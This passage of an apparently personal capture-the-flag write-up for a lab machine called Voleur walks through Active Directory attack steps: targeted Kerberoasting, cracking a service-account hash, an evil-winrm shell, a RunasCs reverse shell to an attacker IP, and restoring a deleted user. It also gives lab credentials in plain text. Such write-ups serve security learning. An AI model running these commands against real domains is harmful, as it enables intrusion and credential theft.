class="SemanticString">BloodHound found 9 users, but returned no information on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString">. Both </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ryan.naylor</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">maria.bryant</code></span><span class="SemanticString"> are in the First-Line Technicians group, and neither have any outbound control.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f78075b595f6e899eade87" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_ryan_groups.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_ryan_groups.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/29e0b98a88f780569678f560ecd37820" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at the service accounts, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_ldap</code></span><span class="SemanticString"> has </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">WriteSPN</code></span><span class="SemanticString"> on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericWrite</code></span><span class="SemanticString"> on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lacey.miller</code></span><span class="SemanticString">, both of which enables </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting">Targeted Kerberoasting</a></span><span class="SemanticString"> attacks.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f7800982c1f3cee31b52dc" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_svc_ldap_graph.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_svc_ldap_graph.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/29e0b98a88f7804e95b8da2fd9c290bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s also in a group called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Restore_Users</code></span><span class="SemanticString">, which likely grants privileges to restore Todd’s account.</span></span></p></div><div id="https://www.notion.so/24e0b98a88f781c79c9efc8f9075bf01" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f781829b2ce0dea94eba59" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f7817394efe628a3a4c172" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7817394efe628a3a4c172"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f780738ec3d6efc86df107" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780738ec3d6efc86df107"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Targeted Kerberoasting:</span></span></h3><div id="https://www.notion.so/24e0b98a88f780968dd9f55c38373361" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ve already covered Targeted Kerberoasting in the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/administrator">Administrator writeup</a></span><span class="SemanticString">. In short, a Kerberoast attack is to request a service ticket from Kerberos and perform offline cracking, since the returned ticket is encrypted by the target service’s NTLM hash. Normally, this only works against service accounts, as the target must have a Service Principal Name (SPN) set. However, with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GenericWrite</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">WriteSPN</code></span><span class="SemanticString">, I can set the SPN myself, effectively making </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lacey.miller</code></span><span class="SemanticString"> roastable.</span></span></p></div><div id="https://www.notion.so/29e0b98a88f7801f88cfc172e463e262" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once again I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py</a></span><span class="SemanticString"> to obtain the hashes for the two accounts:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78068bd09c327df356e24" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-getTGT -dc-ip 10.129.232.130 &#x27;voleur.htb/svc_ldap:M1XyC9pW7qT5Vn&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_ldap.ccache
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> KRB5CCNAME=svc_ldap.ccache python targetedKerberoast.py --dc-ip 10.129.232.130 -v -d voleur.htb --dc-host &#x27;dc.voleur.htb&#x27; -u &#x27;svc_ldap&#x27; -k --no-pass --request-user svc_winrm -o svc_winrm.hash
+
+[*] Starting kerberoast attacks
+[*] Attacking user (svc_winrm)
+[VERBOSE] SPN added successfully for (svc_winrm)
+[+] Writing hash to file for (svc_winrm)
+[VERBOSE] SPN removed successfully for (svc_winrm)
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> KRB5CCNAME=svc_ldap.ccache python targetedKerberoast.py --dc-ip 10.129.232.130 -v -d voleur.htb --dc-host &#x27;dc.voleur.htb&#x27; -u &#x27;svc_ldap&#x27; -k --no-pass --request-user lacey.miller -o lacey.miller.hash
+
+[*] Starting kerberoast attacks
+[*] Attacking user (lacey.miller)
+[VERBOSE] SPN added successfully for (lacey.miller)
+[+] Writing hash to file for (lacey.miller)
+[VERBOSE] SPN removed successfully for (lacey.miller)</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780ab8349e1474f55d9b6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString">&#x27;s hash can be cracked:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7803bb9bce2d2ee6efd0a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=/usr/share/wordlists/rockyou.txt svc_winrm.hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>AFireInsidedeOzarctica980219afi (?)</span></mark></span><span class="SemanticString"><span>     
+1g 0:00:00:03 DONE (2025-08-01 01:49) 0.3058g/s 3508Kp/s 3508Kc/s 3508KC/s AJsupertramp..ADRIANAH
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. </span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780ad9124e2faaaa6f5d2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll request a ticket for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString">, and use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString"> to get a shell:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78004ab78c829efd9164d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-getTGT -dc-ip 10.129.10.190 &#x27;voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_winrm.ccache</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>
+
+┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> KRB5CCNAME=svc_winrm.ccache evil-winrm -r voleur.htb -i dc.voleur.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\svc_winrm\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+voleur\svc_winrm</span></span></span></code></pre><h3 id="https://www.notion.so/24e0b98a88f780de9209f77be5b5e1d0" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780de9209f77be5b5e1d0"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">User Flag:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f78097bbb6de9a4df22480" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\svc_winrm\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+cf8cccc0************************</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f7817eb2b4ff89ed1e6c96" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f781a8a570c9081130e46a" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f7810db25ed86d60ad148a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7810db25ed86d60ad148a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_ldap</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f7808fa184d365d4545345" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7808fa184d365d4545345"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Root Directory:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f78020827bd88975d4cab6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_winrm\desktop&gt;</span></mark></span><span class="SemanticString"><span> dir c:\
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\
+
+01/29/2025  02:10 AM    &lt;DIR&gt;          Finance
+01/29/2025  02:10 AM    &lt;DIR&gt;          HR
+05/29/2025  03:07 PM    &lt;DIR&gt;          inetpub
+01/29/2025  02:10 AM    &lt;DIR&gt;          IT
+05/08/2021  01:20 AM    &lt;DIR&gt;          PerfLogs
+07/24/2025  01:10 PM    &lt;DIR&gt;          Program Files
+01/30/2025  06:53 AM    &lt;DIR&gt;          Program Files (x86)
+01/30/2025  04:38 AM    &lt;DIR&gt;          Users
+06/05/2025  12:53 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               9 Dir(s)   3,816,169,472 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780618ecbdaf267b73532" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The folders for the three SMB shares are found in the root directory. Both </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Finance</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HR</code></span><span class="SemanticString"> are empty.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780fe85b8d76ae44e1209" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\&gt;</span></mark></span><span class="SemanticString"><span> dir finance
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\finance
+
+01/29/2025  02:10 AM    &lt;DIR&gt;          .
+               0 File(s)              0 bytes
+               1 Dir(s)   3,815,120,896 bytes free
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\&gt;</span></mark></span><span class="SemanticString"><span> dir hr
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\hr
+
+01/29/2025  02:10 AM    &lt;DIR&gt;          .
+               0 File(s)              0 bytes
+               1 Dir(s)   3,815,120,896 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7800291f6c4cba7d674de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">IT</code></span><span class="SemanticString"> actually contains 3 subfolders, but </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ryan.naylor</code></span><span class="SemanticString"> could only see </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">First-Line Support</code></span><span class="SemanticString">  in SMB.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780f4991ecd23b482c166" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\&gt;</span></mark></span><span class="SemanticString"><span> dir it
+
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\it
+
+01/29/2025  02:10 AM    &lt;DIR&gt;          .
+01/29/2025  02:40 AM    &lt;DIR&gt;          First-Line Support
+01/29/2025  08:13 AM    &lt;DIR&gt;          Second-Line Support
+01/30/2025  09:11 AM    &lt;DIR&gt;          Third-Line Support
+               0 File(s)              0 bytes
+               4 Dir(s)   3,815,120,896 bytes free</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78024ac17fb7243a6d862" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_winrm</code></span><span class="SemanticString"> does not have access to any of them.</span></span></p></div><h3 id="https://www.notion.so/24e0b98a88f7805797e3e828fcc937a3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7805797e3e828fcc937a3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Restore Deleted User:</span></span></h3><div id="https://www.notion.so/29e0b98a88f780ddb9afdb70aacc04f5" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_svc_ldap_graph.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/voleur/ad_svc_ldap_graph.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/29e0b98a88f78099b814f0d5f0030263" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recall that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_ldap</code></span><span class="SemanticString"> is in a group called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Restore_Users</code></span><span class="SemanticString">, which probably grants privileges to restore deleted objects. It’s much easier enumerating this in an interactive shell, so I’ll spawn one for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_ldap</code></span><span class="SemanticString"> using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780b98df2d1e2552de554" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\svc_winrm\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\runascs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.36:8001
+
+[*] Warning: The logon for user &#x27;svc_ldap&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-135fb5$\Default
+[+] Async process &#x27;C:\Windows\system32\cmd.exe&#x27; with pid 1428 created in background.</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780cfb933f19d490f66fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since it’s a domain controller, it’ll likely have PowerShell’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps">ActiveDirectory module</a></span><span class="SemanticString"> installed. I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Get-ADObject</code></span><span class="SemanticString"> to query for deleted object, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString">&#x27;s user object is returned:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78010bb8ecccd9ddd5a89" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>PS C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> Get-ADObject -filter &#x27;isDeleted -eq $true&#x27; -includeDeletedObjects -Properties *
+
+
+CanonicalName                   : voleur.htb/Deleted Objects
+CN                              : Deleted Objects
+Created                         : 1/29/2025 12:42:27 AM
+createTimeStamp                 : 1/29/2025 12:42:27 AM
+Deleted                         : True
+Description                     : Default container for deleted objects
+DisplayName                     : 
+DistinguishedName               : CN=Deleted Objects,DC=voleur,DC=htb
+dSCorePropagationData           : {12/31/1600 4:00:00 PM}
+instanceType                    : 4
+isCriticalSystemObject          : True
+isDeleted                       : True
+LastKnownParent                 : 
+Modified                        : 1/29/2025 4:44:42 AM
+modifyTimeStamp                 : 1/29/2025 4:44:42 AM
+Name                            : Deleted Objects
+ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=voleur,DC=htb
+ObjectClass                     : container
+ObjectGUID                      : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8
+ProtectedFromAccidentalDeletion : 
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+systemFlags                     : -1946157056
+uSNChanged                      : 13005
+uSNCreated                      : 5659
+whenChanged                     : 1/29/2025 4:44:42 AM
+whenCreated                     : 1/29/2025 12:42:27 AM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+CN                              : Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/29/2025 1:08:06 AM
+createTimeStamp                 : 1/29/2025 1:08:06 AM
+Deleted                         : True
+Description                     : Second-Line Support Technician
+DisplayName                     : Todd Wolfe
+DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted 
+                                  Objects,DC=voleur,DC=htb
+dSCorePropagationData           : {5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 AM, 1/29/2025 1:08:06 
+                                  AM...}
+givenName                       : Todd
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 133826301603754403
+lastLogonTimestamp              : 133826287869758230
+logonCount                      : 3
+memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management 
+                                  Users,CN=Builtin,DC=voleur,DC=htb}
+Modified                        : 5/13/2025 4:11:17 PM
+modifyTimeStamp                 : 5/13/2025 4:11:17 PM
+msDS-LastKnownRDN               : Todd Wolfe
+Name                            : Todd Wolfe
+                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  : 
+ObjectClass                     : user
+ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
+objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133826280731790960
+sAMAccountName                  : todd.wolfe
+sDRightsEffective               : 0
+sn                              : Wolfe
+userAccountControl              : 66048
+userPrincipalName               : todd.wolfe@voleur.htb
+uSNChanged                      : 45088
+uSNCreated                      : 12863
+whenChanged                     : 5/13/2025 4:11:17 PM
+whenCreated                     : 1/29/2025 1:08:06 AM</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f7809f817fc4e0d95e2fbb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll then restore </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">todd.wolfe</code></span><span class="SemanticString">&#x27;s account with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Restore-ADObject</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7800599d1d88cd950f0ba" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>PS C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> Get-AdObject -Filter &quot;SamAccountName -eq &#x27;todd.wolfe&#x27;&quot; -IncludeDeletedObjects | Restore-ADObject</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f78006ba2cc31f5a127cdb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now the user re-appears:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780b68eedeecec491b00d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>PS C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    jeremy.combs             
+krbtgt                   lacey.miller             marie.bryant             
+ryan.naylor              svc_backup               svc_iis                  
+svc_ldap                 svc_winrm                todd.wolfe               
